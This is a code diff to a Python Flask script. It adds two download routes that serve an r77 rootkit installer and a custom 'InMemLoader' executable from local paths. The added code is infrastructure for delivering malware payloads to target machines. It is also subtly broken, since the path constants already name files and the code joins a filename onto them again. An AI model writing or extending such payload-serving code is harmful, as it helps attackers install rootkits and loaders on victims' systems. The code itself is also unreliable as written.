@@ -99,6 +99,26 @@ def ask_if_forwarded():
             print("No selection made. Exiting...")
             exit(0)  # Exit the program if no selection is made
 
+EXE_DIR = r'C:\Users\mxmla\Downloads\r77Rootkit 1.7.0\install.exe'
+MEM_DIR = r'C:\Users\mxmla\source\repos\InMemLoader\InMemLoader\bin\Debug\net8.0\InMemLoader.exe'
+
+@app.route('/download', methods=['GET'])
+def download_exe():
+    filename = 'install.exe'
+    file_path = os.path.join(EXE_DIR, filename)
+    if os.path.exists(file_path):
+        return send_from_directory(EXE_DIR, filename, as_attachment=True)
+    else:
+        return "install.exe not found", 404
+
+@app.route('/InMemLoader.exe', methods=['GET'])
+def download_memloader():
+    filename = 'InMemLoader.exe'
+    file_path = os.path.join(MEM_DIR, filename)
+    if os.path.exists(file_path):
+        return send_from_directory(MEM_DIR, filename, as_attachment=True)
+    else:
+        return "InMemLoader.exe not found", 404
 
 
 # ==== Interactive Blessed Menu ====
